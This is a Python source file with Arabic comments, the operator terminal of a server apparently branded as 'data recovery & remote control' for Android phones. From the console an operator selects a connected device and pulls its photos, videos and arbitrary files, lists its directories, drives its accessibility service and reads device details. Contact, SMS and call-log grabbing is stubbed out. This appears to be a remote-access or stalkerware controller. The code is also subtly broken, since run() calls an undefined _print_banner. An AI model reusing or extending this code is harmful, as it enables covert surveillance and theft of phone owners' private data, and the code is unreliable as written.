#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
terminal.py
============================================================
واجهة الطرفية (CLI) للتحكم بالسيرفر والعملاء.

المسؤوليات:
  1. قراءة أوامر المستخدم (async).
  2. تحليلها عبر CommandParser.
  3. تنفيذها عبر SessionManager والمعالجات.
  4. عرض النتائج بشكل جميل.
  5. إدارة العميل المحدد حالياً (current_client).

يعتمد على:
  - CommandParser (commands/parser.py)
  - SessionManager (core/session_manager.py)
  - PhotosCommand, VideosCommand, FilesCommand, AccessibilityCommand

الاستخدام:
  cli = TerminalCLI(session_manager)
  await cli.run()
============================================================
"""

import asyncio
import logging
import os
import sys
import time
from typing import Any, Dict, List, Optional

from commands.parser import CommandParser, ParsedCommand
from commands.photos import get_photos_handler
from commands.videos import get_videos_handler
from commands.files import get_files_handler, FilesCommand
from commands.accessibility import get_accessibility_handler, AccessibilityCommand
from core.session_manager import SessionManager

logger = logging.getLogger("terminal")


# ============================================================
# 1. الرموز والألوان (ANSI)
# ============================================================
class C:
    """أكواد الألوان."""
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"


def _supports_color() -> bool:
    """هل الطرفية تدعم الألوان؟"""
    if os.environ.get("NO_COLOR"):
        return False
    if not hasattr(sys.stdout, "isatty"):
        return False
    return sys.stdout.isatty()


USE_COLOR = _supports_color()


def c(text: str, color: str) -> str:
    """تلوين النص إن كانت الطرفية تدعم."""
    if not USE_COLOR:
        return text
    return f"{color}{text}{C.RESET}"


# ============================================================
# 2. TerminalCLI
# ============================================================
class TerminalCLI:
    """
    واجهة الطرفية الرئيسية.
    """

    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager

        # المحلّل
        self.parser = CommandParser()

        # المعالجات
        self.photos = get_photos_handler(session_manager)
        self.videos = get_videos_handler(session_manager)
        self.files  = get_files_handler(session_manager)
        self.acc    = get_accessibility_handler(session_manager)

        # الحالة
        self.running = False
        self.current_client_id: Optional[str] = None

        # سجل الأوامر (للأسهم لاحقاً)
        self.history: List[str] = []

        # مهام الخلفية
        self._cleanup_task: Optional[asyncio.Task] = None

    # ========================================================
    # 2.1 دورة الحياة
    # ========================================================
    async def run(self) -> None:
        """حلقة الطرفية الرئيسية."""
        self.running = True

        # رسالة الترحيب
        self._print_banner()

        # مهمة تنظيف دورية (كل 60 ثانية)
        self._cleanup_task = asyncio.create_task(self._periodic_cleanup())

        try:
            while self.running:
                try:
                    # ----- قراءة الأمر -----
                    prompt = self._build_prompt()
                    line = await self._async_input(prompt)

                    if line is None:  # EOF
                        print()
                        break

                    line = line.strip()
                    if not line:
                        continue

                    # ----- إضافة للسجل -----
                    self.history.append(line)
                    if len(self.history) > 100:
                        self.history.pop(0)

                    # ----- تحليل وتنفيذ -----
                    cmd = self.parser.parse(line)
                    await self._execute(cmd)

                except asyncio.CancelledError:
                    break
                except KeyboardInterrupt:
                    print(f"\n{c('(Ctrl+C) استخدم EXIT للخروج', C.YELLOW)}")
                    continue
                except Exception as e:
                    logger.exception(f"Command loop error: {e}")
                    print(c(f"❌ خطأ: {e}", C.RED))

        finally:
            self.running = False
            await self._shutdown()

    async def _shutdown(self) -> None:
        """إيقاف نظيف."""
        if self._cleanup_task and not self._cleanup_task.done():
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass
        print(c("\n👋 إلى اللقاء!", C.CYAN))

    # ========================================================
    # 2.2 قراءة الإدخال (async)
    # ========================================================
    async def _async_input(self, prompt: str) -> Optional[str]:
        """قراءة سطر بدون تعطيل event loop."""
        loop = asyncio.get_event_loop()
        try:
            return await loop.run_in_executor(None, input, prompt)
        except EOFError:
            return None

    def _build_prompt(self) -> str:
        """بناء نص الـ prompt."""
        if self.current_client_id:
            return c(f"[{self.current_client_id}]> ", C.GREEN)
        return c("RDP> ", C.CYAN)

    # ========================================================
    # 2.3 تنفيذ الأمر
    # ========================================================
    async def _execute(self, cmd: ParsedCommand) -> None:
        """توجيه الأمر حسب نوعه."""

        # ----- خطأ في التحليل -----
        if not cmd.valid:
            print(c(f"❌ {cmd.error}", C.RED))
            return

        # ----- التوجيه -----
        name = cmd.name

        try:
            if name == "EXIT":
                self.running = False

            elif name == "CLEAR":
                self._clear_screen()

            elif name == "HELP":
                self._show_help(cmd.args.get("command"))

            elif name == "SESSIONS":
                self._show_sessions()

            elif name == "SELECT":
                self._select_client(cmd.args.get("client_id"))

            elif name == "GET_PHOTOS":
                await self._cmd_get_photos(cmd.args)

            elif name == "GET_VIDEOS":
                await self._cmd_get_videos(cmd.args)

            elif name == "GET_FILE":
                await self._cmd_get_file(cmd.args)

            elif name == "LIST_DIR":
                await self._cmd_list_dir(cmd.args)

            elif name == "ACCESSIBILITY":
                await self._cmd_accessibility(cmd.args)

            elif name == "GET_DEVICE_INFO":
                await self._cmd_device_info()

            elif name == "PING":
                await self._cmd_ping()

            elif name in ("STOP", "GET_CONTACTS", "GET_SMS", "GET_CALL_LOGS"):
                print(c(f"⚠️  الأمر {name} غير منفّذ بعد", C.YELLOW))

            else:
                print(c(f"❓ أمر غير معروف: {name}", C.YELLOW))

        except Exception as e:
            logger.exception(f"Execute error for {name}: {e}")
            print(c(f"❌ فشل التنفيذ: {e}", C.RED))

    # ========================================================
    # 2.4 الأوامر: الجلسات
    # ========================================================
    def _show_sessions(self) -> None:
        """عرض الجلسات."""
        sessions = self.session_manager.get_all_sessions()

        if not sessions:
            print(c("📭 لا توجد جلسات متصلة", C.YELLOW))
            return

        print()
        print(c(f"📱 الجلسات المتصلة ({len(sessions)}):", C.BOLD))
        print(c("─" * 70, C.DIM))

        for s in sessions:
            marker = "▶️ " if s.client_id == self.current_client_id else "   "
            status = c("🟢", C.GREEN) if s.is_alive else c("🔴", C.RED)

            device = s.device_info.get("manufacturer", "?")
            model = s.device_info.get("model", "?")
            android = s.device_info.get("android", "?")
            autopilot = "✓" if s.device_info.get("autopilot") else "✗"

            print(
                f"{marker}{status} "
                f"{c(s.client_id, C.CYAN)}  "
                f"{device} {model}  "
                f"Android {android}  "
                f"AutoPilot: {autopilot}"
            )

        print()

    def _select_client(self, client_id: Optional[str]) -> None:
        """اختيار عميل."""
        if not client_id:
            print(c("❌ استخدم: SELECT <client_id>", C.RED))
            return

        session = self.session_manager.get_session(client_id)
        if session is None:
            print(c(f"❌ عميل غير موجود: {client_id}", C.RED))
            return

        self.current_client_id = client_id
        print(c(f"✓ تم اختيار العميل: {client_id}", C.GREEN))

    def _require_client(self) -> Optional[str]:
        """التأكد من وجود عميل محدد."""
        if not self.current_client_id:
            print(c("❌ لم يتم اختيار عميل. استخدم: SESSIONS ثم SELECT <id>", C.RED))
            return None
        if not self.session_manager.get_session(self.current_client_id):
            print(c(f"❌ العميل انقطع: {self.current_client_id}", C.RED))
            self.current_client_id = None
            return None
        return self.current_client_id

    # ========================================================
    # 2.5 الأوامر: البيانات
    # ========================================================
    async def _cmd_get_photos(self, args: Dict[str, Any]) -> None:
        cid = self._require_client()
        if not cid:
            return

        limit = args.get("limit", 0)
        offset = args.get("offset", 0)
        path = args.get("path")

        print(c(f"📸 إرسال GET PHOTOS إلى {cid}...", C.CYAN))
        ok = await self.photos.execute(cid, limit=limit, offset=offset, path=path)

        if ok:
            print(c("✓ تم الإرسال. الملفات ستُحفظ تدريجياً.", C.GREEN))
        else:
            print(c("❌ فشل الإرسال", C.RED))

    async def _cmd_get_videos(self, args: Dict[str, Any]) -> None:
        cid = self._require_client()
        if not cid:
            return

        limit = args.get("limit", 0)
        offset = args.get("offset", 0)
        path = args.get("path")

        print(c(f"🎬 إرسال GET VIDEO إلى {cid}...", C.CYAN))
        ok = await self.videos.execute(cid, limit=limit, offset=offset, path=path)

        if ok:
            print(c("✓ تم الإرسال. الفيديوهات ستُحفظ تدريجياً.", C.GREEN))
        else:
            print(c("❌ فشل الإرسال", C.RED))

    async def _cmd_get_file(self, args: Dict[str, Any]) -> None:
        cid = self._require_client()
        if not cid:
            return

        path = args.get("path")
        if not path:
            print(c("❌ استخدم: GET FILE <path>", C.RED))
            return

        print(c(f"📄 إرسال GET FILE: {path}", C.CYAN))
        ok = await self.files.execute_get_file(cid, path)

        if ok:
            print(c("✓ تم الإرسال", C.GREEN))
        else:
            print(c("❌ فشل الإرسال", C.RED))

    async def _cmd_list_dir(self, args: Dict[str, Any]) -> None:
        cid = self._require_client()
        if not cid:
            return

        path = args.get("path")
        if not path:
            print(c("❌ استخدم: LIST DIR <path>", C.RED))
            return

        print(c(f"📁 عرض: {path}", C.CYAN))
        result = await self.files.execute_list_dir(cid, path)

        if result is None:
            print(c("❌ فشل الطلب أو انتهت المهلة", C.RED))
            return

        print()
        print(FilesCommand.format_list_result(result))
        print()

    async def _cmd_device_info(self) -> None:
        cid = self._require_client()
        if not cid:
            return

        session = self.session_manager.get_session(cid)
        if session is None:
            return

        info = session.device_info
        print()
        print(c("📱 معلومات الجهاز:", C.BOLD))
        print(c("─" * 50, C.DIM))
        for key, value in info.items():
            print(f"  {c(key, C.CYAN)}: {value}")
        print()

    async def _cmd_ping(self) -> None:
        cid = self._require_client()
        if not cid:
            return

        session = self.session_manager.get_session(cid)
        if session is None:
            return

        t0 = time.time()
        ok = await session.send_command({"cmd": "PING"})
        elapsed = (time.time() - t0) * 1000

        if ok:
            print(c(f"✓ PING sent ({elapsed:.0f}ms)", C.GREEN))
        else:
            print(c("❌ فشل الإرسال", C.RED))

    # ========================================================
    # 2.6 الأوامر: Accessibility
    # ========================================================
    async def _cmd_accessibility(self, args: Dict[str, Any]) -> None:
        cid = self._require_client()
        if not cid:
            return

        action = args.pop("action", None)
        if not action:
            print(c("❌ يجب تحديد إجراء", C.RED))
            return

        print(c(f"🎮 تنفيذ: {action}...", C.CYAN))

        result = await self.acc.execute(cid, action, args)

        success = result.get("success", False)
        message = result.get("message", "")
        elapsed = result.get("elapsed", 0)

        if success:
            print(c(f"✅ {message} ({elapsed*1000:.0f}ms)", C.GREEN))
        else:
            print(c(f"❌ {message}", C.RED))

        # معالجة خاصة لـ DUMP_UI
        if action == "DUMP_UI" and success:
            # انتظار وصول UI tree
            await asyncio.sleep(0.8)
            tree = self.acc.get_last_ui_tree(cid)
            if tree:
                print()
                print(AccessibilityCommand.format_ui_tree(tree))
                print()
            else:
                print(c("⚠️  لم يتم استقبال UI tree بعد", C.YELLOW))

        # معالجة خاصة لـ GET_PACKAGE
        if action == "GET_PACKAGE" and success:
            await asyncio.sleep(0.3)
            pkg = self.acc.get_last_package(cid)
            if pkg:
                print(c(f"📦 الحزمة الحالية: {pkg}", C.CYAN))

    # ========================================================
    # 2.7 المساعدة والعرض
    # ========================================================
    def _show_help(self, command: Optional[str]) -> None:
        """عرض المساعدة."""
        print(self.parser.help_text(command))

    def _show_banner(self) -> None:
        """عرض شاشة الترحيب."""
        banner = f"""
{c('╔══════════════════════════════════════════════════════════╗', C.CYAN)}
{c('║', C.CYAN)}      {c('RecoverDataPhone', C.BOLD + C.WHITE)}  {c('Server v1.0.0', C.DIM)}              {c('║', C.CYAN)}
{c('║', C.CYAN)}      {c('Data Recovery & Remote Control', C.DIM)}              {c('║', C.CYAN)}
{c('╚══════════════════════════════════════════════════════════╝', C.CYAN)}

اكتب {c('HELP', C.YELLOW)} لعرض الأوامر، أو {c('EXIT', C.YELLOW)} للخروج.
"""
        print(banner)

    def _clear_screen(self) -> None:
        """مسح الشاشة."""
        os.system("cls" if os.name == "nt" else "clear")

    # ========================================================
    # 2.8 مهمة التنظيف الدورية
    # ========================================================
    async def _periodic_cleanup(self) -> None:
        """تنظيف دوري للملفات القديمة كل 60 ثانية."""
        while self.running:
            try:
                await asyncio.sleep(60)
                if not self.running:
                    break

                # تنظيف
                removed_p = await self.photos.cleanup_stale()
                removed_v = await self.videos.cleanup_stale()
                removed_f = await self.files.cleanup_stale()

                total = removed_p + removed_v + removed_f
                if total > 0:
                    logger.info(f"Periodic cleanup: removed {total} stale items")

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.exception(f"Cleanup error: {e}")


# ============================================================
# 3. دالة مساعدة للتشغيل المستقل (اختياري)
# ============================================================
async def run_cli_standalone() -> None:
    """
    تشغيل الطرفية وحدها (بدون خادم).
    مفيد للاختبار.
    """
    from core.session_manager import SessionManager
    from utils.logger import setup_logger

    setup_logger(level="INFO")

    sm = SessionManager()
    cli = TerminalCLI(sm)
    await cli.run()


if __name__ == "__main__":
    try:
        asyncio.run(run_cli_standalone())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")